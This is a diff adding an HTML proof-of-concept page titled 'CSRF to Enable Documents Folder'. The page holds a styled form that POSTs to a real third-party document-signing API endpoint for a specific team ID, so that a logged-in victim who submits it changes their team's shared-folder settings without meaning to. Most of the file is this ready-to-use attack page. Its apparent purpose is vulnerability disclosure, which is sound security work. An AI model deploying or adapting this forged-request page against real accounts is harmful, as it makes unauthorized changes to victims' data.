@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF to Enable Documents Folder</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    h2 {
+      color: #333;
+    }
+    label {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+    input[type="text"] {
+      padding: 8px;
+      width: 100%;
+      max-width: 300px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+    input[type="submit"] {
+      padding: 10px 15px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #f4f4f4;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>CSRF to Enable Documents Folder</h2>
+    <!-- Form that sends POST request -->
+    <form id="teamIDForm" action="https://app.signnow.com/api/team/f10474f3c4074deca43f99cef7fd1cd02f64107c/shared/document/folder" method="POST">
+      <label for="teamID">Enter Team ID:</label><br>
+      <input type="text" id="teamID" name="teamID" required><br><br>
+      <input type="submit" value="Submit">
+    </form>
+  </div>
+
+  <script>
+    // Optional: You can add JavaScript validation or processing before submitting the form
+
+    // Example: Automatically submit the form after the user enters a teamID
+    document.getElementById('teamIDForm').addEventListener('submit', function(event) {
+      var teamID = document.getElementById('teamID').value;
+      if (!teamID) {
+        alert('Please enter a Team ID');
+        event.preventDefault(); // Prevent the form from submitting if teamID is empty
+      }
+    });
+  </script>
+</body>
+</html>
